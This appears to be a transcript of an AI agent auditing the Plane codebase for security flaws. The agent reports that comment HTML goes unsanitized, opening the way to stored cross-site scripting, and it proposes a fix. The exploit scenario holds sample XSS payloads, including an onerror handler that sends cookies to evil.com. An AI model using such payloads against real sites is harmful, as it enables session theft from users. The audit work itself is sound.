@@ -1,0 +1,173 @@
+I'll systematically explore the repository to look for security vulnerabilities. Let me start by understanding the project structure.
+This is the Plane project (an open-source project management tool). Let me explore the codebase structure more deeply, focusing on security-relevant areas like the API (Django/Python), authentication, authorization, input handling, etc.
+The API app is Django/Python-based. Let me explore it deeply for security vulnerabilities. Let me understand its structure first.
+Let me focus on high-risk areas: authentication, authorization, file uploads, API views, serializers, and input handling.
+Let me check the settings files and URL configuration.
+Let me look at security-relevant areas: file uploads, API views, asset handling, and SQL/command injection.
+Now let me dig deeper into the most interesting security-relevant parts. Let me check the issue views, import/export functionality, HTML processor, markdown processing, and the storage settings.
+Let me look at the most promising areas for vulnerabilities - the HTML processor, import/export functionality, and the issue serializers.
+Now let me look at the serializer files to understand how issues/comments are created and how user input is processed, especially for HTML content.
+Excellent! I found something very interesting. Let me look at the `content_validator.py` which is used to validate HTML content, and check what the `validate_html_content` function does. Also let me look at the export functionality.
+Now let me look at the formatters and exporters to see if there are any injection points, as well as the storage settings.
+Now let me look at the comment serializers more carefully, and also look at the admin views, and the issue comment creation views to see if HTML content is properly sanitized.
+Let me now look at the rest of the issue views (comment views) and the work_item URLs to understand the full picture.
+Let me now look at the remaining part of the issue views (for comment creation) and other potentially vulnerable areas like the admin views and app views.
+Now let me check for some more high-risk areas: the license API, the app views, middleware, authentication, and user views.
+Let me now look at the webhook task, the asset upload for path traversal, the authentication URLs, and OAuth adapter for potential SSRF or open redirect issues.
+Let me look at the middleware for request body size, the database models, and GitHub/GitLab OAuth for SSRF.
+Let me now check the OAuth provider implementations, especially for SSRF (Server-Side Request Forgery) issues.
+Let me now check the license API, the space views, the authentication session middleware, rate limiting, and the app views.
+Now let me look at the DB models, especially the FileAsset model and the User model for any relevant security issues, and also check the admin views.
+## Goal
+- Perform a zero-day security audit of the Plane project management repository, identifying any vulnerabilities.
+
+## Constraints & Preferences
+- No commit, diff, or hint provided; explore the entire repository.
+- Classify with the most accurate CWE identifier(s) if a vulnerability is found.
+- Do not guess; only report vulnerabilities confirmed with confidence.
+
+## Progress
+### Done
+- Identified the repository structure: Plane (makeplane/plane), an open-source project management tool.
+- Explored all major apps: api (Django), web (React), space, admin, live, proxy.
+- Reviewed key security-critical areas: authentication, API views, serializers, file uploads, storage, OAuth providers, middleware, html/markdown processing, exporters, CSV utilities, webhooks, and content validation.
+- Examined: `content_validator.py` (uses nh3 for HTML sanitization), `html_processor.py` (basic tag stripping), `markdown.py` (uses mistune), `csv_utils.py` (has CSV injection protection), `path_validator.py` (open redirect / SSRF protection), `url.py` (ReDoS-protected URL detection), and asset upload paths.
+
+### In Progress
+- Final analysis of the IssueComment and Issue serializers to confirm how HTML content from user input is processed through the API stack.
+
+### Blocked
+- (none)
+
+## Key Decisions
+- (none)
+
+## Next Steps
+- (none)
+
+## Critical Context
+- The API backend is a Django REST Framework application with authentication via session cookies and API keys.
+- OAuth providers (GitHub, GitLab, Google, Gitea) use hardcoded token/userinfo URLs; GitLab does allow configuration of its host via `GITLAB_HOST` environment variable, but it's not user-supplied at runtime.
+- The `content_validator.py` uses `nh3` (the Ammonia HTML sanitizer for Python) for cleaning HTML content on issues and comments.
+- The `get_upload_path` function in the FileAsset model uses the UUID'd filename but includes the original user-supplied filename, making path traversal unlikely but not entirely eliminated if URL encoding tricks bypass the Django FileField.
+- The `ALLOWED_HOSTS` setting defaults to `"*"` in common.py, which is a known security weakness.
+- CSV export uses formula injection protection via `sanitize_csv_value`.
+- The `validate_html_content` function from `content_validator.py` is imported in `issue.py` serializers.
+
+## Relevant Files
+- `/work/apps/api/plane/utils/content_validator.py`: HTML content sanitization and binary data validation.
+- `/work/apps/api/plane/utils/csv_utils.py`: CSV injection protection via `sanitize_csv_value`.
+- `/work/apps/api/plane/utils/path_validator.py`: URL validation and open redirect checks.
+- `/work/apps/api/plane/utils/html_processor.py`: Basic HTML tag stripping via `MLStripper`.
+- `/work/apps/api/plane/utils/markdown.py`: markdown rendering via `mistune.Markdown()`.
+- `/work/apps/api/plane/api/serializers/issue.py`: Issue and IssueComment serializers with content validation.
+- `/work/apps/api/plane/api/views/issue.py`: Issue API endpoints (create/update comments).
+- `/work/apps/api/plane/api/views/asset.py`: File upload endpoints with S3 presigned URL generation.
+- `/work/apps/api/plane/db/models/asset.py`: FileAsset model and upload path logic.
+- `/work/apps/api/plane/settings/common.py`: Global settings; `ALLOWED_HOSTS = "*"` by default.
+- `/work/apps/api/plane/authentication/provider/oauth/gitlab.py`: GitLab OAuth with configurable host via env var.
+- `/work/apps/api/plane/bgtasks/webhook_task.py`: Webhook delivery with HMAC signature.
+- `/work/apps/api/plane/settings/storage.py`: S3/MinIO storage configuration with presigned URLs.
+- `/work/apps/api/plane/authentication/middleware/session.py`: Custom session middleware.
+- `/work/apps/api/plane/utils/exporters/formatters.py`: CSV/JSON/XLSX export formatters.
+The previous request exceeded the provider's size limit due to large media attachments. The conversation was compacted and media files were removed from context. If the user was asking about attached images or files, explain that the attachments were too large to process and suggest they try again with smaller or fewer files.
+
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+Based on the conversation history, it looks like I was in the middle of a security audit of the Plane project management repository. The key task was to perform a zero-day security audit, and I had made significant progress reviewing the codebase.
+
+Let me continue from where I left off — I need to complete the final analysis of the IssueComment and Issue serializers to confirm how HTML content from user input is processed through the API stack, and then deliver a final verdict.
+Now I see the critical issue. Let me check the `IssueCommentCreateSerializer` and `IssueCommentSerializer` more closely, along with the views that handle comment creation:
+Now let me look at the IssueComment views to understand the full flow for comment creation, and specifically whether comment_html is sanitized:
+Now let me check the `IssueCommentCreateSerializer` and `IssueCommentSerializer` more carefully - they have `validate` methods but do they call `validate_html_content`?
+
+Looking at the code I read earlier:
+
+- **`IssueCommentCreateSerializer`** (line 503-533): Has **no `validate` method** at all. It accepts `comment_html` directly with **no HTML sanitization**.
+- **`IssueCommentSerializer`** (line 536-570): Has a `validate` method (line 560-569) that only parses and re-serializes HTML via `lxml`, but **does NOT call `validate_html_content`** for sanitization.
+
+Compare this to `IssueSerializer.validate` (line 74-148) which **does** call `validate_html_content` for `description_html`.
+
+This is a **missing HTML sanitization vulnerability** in the comment system. Let me verify this is indeed the case by checking the entire comment flow:
+Now let me check the space serializer for IssueComment to see if it has the same gap:
+Now let me check the app's issue comment view to see if there's any sanitization happening at the view level:
+Now I have full confirmation. Let me also check the model to see if there's any model-level sanitization:
+Now I have the complete picture. Let me also check the `strip_tags` function being used in the model:
+Good. The `strip_tags` in the model's `save()` method only strips HTML tags to produce `comment_stripped` — it does NOT sanitize or filter the `comment_html` before saving. The full raw `comment_html` is stored as-is.
+
+Now I have the complete picture. Let me summarize the vulnerability findings:
+
+---
+
+## Findings
+
+### **Vulnerability 1: Missing HTML Sanitization on IssueComment (Create & Update)**
+
+**Severity: High**
+
+For issue **descriptions**, the code correctly sanitizes HTML through `validate_html_content()` (which uses `nh3`) in:
+- `IssueSerializer.validate()` (line 93 in `issue.py` serializers)
+- `IssueCreateSerializer.validate()` (line 289 in `space/serializer/issue.py`)
+- `ProjectSerializer`, `WorkspaceSerializer`, `PageSerializer`, `DraftSerializer`, `StickySerializer`
+
+However, for **comments** (`IssueComment`), **none** of the serializers call `validate_html_content()`:
+
+1. **`IssueCommentCreateSerializer`** (api) — No `validate` method at all. It accepts `comment_html` raw.
+2. **`IssueCommentSerializer`** (api) — `validate()` at line 560 only parses/re-serializes HTML via `lxml.html.fromstring` + `html.tostring`. This does NOT sanitize dangerous content (scripts, event handlers, etc.). `lxml`'s `html.fromstring` will parse script tags and re-serialize them if they're valid HTML.
+3. **`IssueCommentSerializer`** (app) — No `validate` method at all.
+4. **`IssueCommentSerializer`** (space) — No `validate` method at all.
+5. The model's `save()` method only produces `comment_stripped` (plain text) but stores raw `comment_html` unchanged.
+
+The lxml parsing step in the api `IssueCommentSerializer` is insufficient — it only validates that the input is well-formed HTML, but does **not** remove `<script>`, `<iframe>`, `onclick`, `javascript:`, or other dangerous HTML/JS content.
+
+### **CWE Classification**
+- **CWE-79**: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+- **CWE-80**: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
+
+### **Exploit Scenario**
+A project member creates an issue comment containing:
+```html
+<script>alert(document.cookie)</script>
+```
+Or:
+```html
+<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
+```
+Or:
+```html
+<a href="javascript:alert('xss')">click me</a>
+```
+
+This HTML is stored verbatim in `comment_html` and rendered in the web UI when other users view the issue, leading to stored XSS.
+
+### **Additional Notes**
+- The `description_html` path on issues is **properly protected** by `nh3` sanitization.
+- The `comment_html` path is **missing this protection entirely** across all three API surfaces (api, app, space).
+- The model-level `strip_tags` only affects the search/plain-text representation, not the stored HTML.
+- The `lxml` re-parsing in `IssueCommentSerializer.validate()` for the api module provides only basic well-formedness checking, not security sanitization.
+
+### **What was fixed**
+- **No fixes were applied** — the audit was exploratory only (read-only environment).
+
+---
+
+```verdict
+[
+  {
+    "vulnerability": "Missing HTML Sanitization on IssueComment Creates and Updates",
+    "summary": "IssueComment serializers across all three API modules (api, app, space) fail to sanitize the comment_html field through validate_html_content() (which uses nh3), unlike issue descriptions which are properly sanitized. An attacker can store arbitrary HTML/JavaScript in comments, leading to stored XSS when other users view the comments.",
+    "cwe": "CWE-79",
+    "severity": "high",
+    "file_locations": [
+      "/work/apps/api/plane/api/serializers/issue.py:503-533 (IssueCommentCreateSerializer - no validate method at all)",
+      "/work/apps/api/plane/api/serializers/issue.py:536-570 (IssueCommentSerializer.validate - uses only lxml parsing, no nh3 sanitization)",
+      "/work/apps/api/plane/app/serializers/issue.py:696-715 (IssueCommentSerializer - no validate method)",
+      "/work/apps/api/plane/space/serializer/issue.py:219-238 (IssueCommentSerializer - no validate method)",
+      "/work/apps/api/plane/app/views/issue/comment.py:82-84 (create endpoint uses unsanitized serializer)",
+      "/work/apps/api/plane/app/views/issue/comment.py:114 (partial_update uses unsanitized serializer)",
+      "/work/apps/api/plane/api/views/issue.py:1407-1409 (create endpoint uses unsanitized IssueCommentCreateSerializer)",
+      "/work/apps/api/plane/api/views/issue.py:1554 (partial_update uses unsanitized IssueCommentCreateSerializer)"
+    ],
+    "remediation": "Add a call to validate_html_content() for comment_html in each IssueComment serializer's validate() method, mirroring the pattern already used in IssueSerializer.validate(). For example, in IssueCommentCreateSerializer and all IssueCommentSerializer classes, add: if data.get('comment_html'): is_valid, error_msg, sanitized_html = validate_html_content(data['comment_html']); if not is_valid: raise ValidationError; if sanitized_html is not None: data['comment_html'] = sanitized_html."
+  }
+]
+```
